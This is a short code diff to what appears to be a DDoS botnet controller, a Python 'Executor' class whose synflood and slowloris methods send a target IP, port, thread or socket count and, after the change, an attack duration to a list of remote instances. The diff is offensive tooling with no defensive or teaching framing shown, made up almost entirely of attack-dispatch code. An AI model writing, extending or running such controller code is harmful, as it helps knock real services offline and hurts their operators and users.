@@ -17,7 +17,7 @@ class Executor:
             print(e)
             return {"state": 'offline'}
     
-    def synflood(self, data, ip, port, packet,thread):
+    def synflood(self, data, ip, port, duration,thread):
         print(data)
         fail = list()
         for i in data:
@@ -28,7 +28,7 @@ class Executor:
                 instance.sendline(bytes(ip, encoding='utf-8'))
                 instance.sendline(bytes(port, encoding='utf-8'))
                 instance.sendline(bytes(thread, encoding='utf-8'))
-                instance.sendline(bytes(packet, encoding='utf-8'))
+                instance.sendline(bytes(duration, encoding='utf-8'))
                 instance.close()
             
             except Exception as e:
@@ -37,7 +37,7 @@ class Executor:
             
         return fail
         
-    def slowloris(self, data, ip, port, sockets):
+    def slowloris(self, data, ip, port, sockets,duration):
         print(data)
         fail = list()
         
@@ -49,6 +49,8 @@ class Executor:
                 instance.sendline(bytes(ip, encoding='utf-8'))
                 instance.sendline(bytes(port, encoding='utf-8'))
                 instance.sendline(bytes(sockets, encoding='utf-8'))
+                instance.sendline(bytes(duration, encoding='utf-8'))
+
                 instance.close()
             
             except Exception as e:
